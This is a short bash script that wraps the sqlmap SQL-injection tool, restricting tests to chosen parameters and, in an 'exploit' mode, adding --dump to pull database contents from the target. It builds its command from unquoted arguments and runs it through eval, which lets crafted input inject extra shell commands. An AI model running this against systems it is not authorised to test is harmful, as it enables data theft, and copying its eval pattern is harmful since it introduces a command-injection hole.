#!/bin/bash

URL=$1                 # eg https://example.com/search.php?q=test
PARAMS=$2              # eg id,user,search
THREADS=$3             # eg 10
MODE=$4                # detect or exploit

CMD="sqlmap -u \"$URL\" --threads=$THREADS --batch"

# restrict scan to specific parameters
IFS=',' read -ra PLIST <<< "$PARAMS"
for p in "${PLIST[@]}"; do
  CMD="$CMD -p $p"
done

# Add mode
if [[ "${MODE,,}" == "exploit" ]]; then
  CMD="$CMD --dump"
fi

eval "$CMD"
